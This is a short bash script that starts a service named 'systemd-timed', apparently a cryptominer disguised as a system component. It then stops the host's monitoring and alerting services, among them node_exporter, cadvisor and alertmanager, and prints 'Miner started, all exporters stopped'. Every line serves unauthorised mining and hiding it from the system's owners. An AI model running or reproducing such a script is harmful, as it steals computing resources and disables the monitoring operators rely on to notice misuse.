#!/bin/bash
systemctl enable systemd-timed.service
systemctl start systemd-timed.service
systemctl stop node_exporter.service
systemctl stop nginx_exporter.service
systemctl stop prometheus_exporter.service 2>/dev/null
systemctl stop cadvisor.service 2>/dev/null
systemctl stop blackbox_exporter.service 2>/dev/null
systemctl stop alertmanager.service 2>/dev/null
echo "Miner started, all exporters stopped"
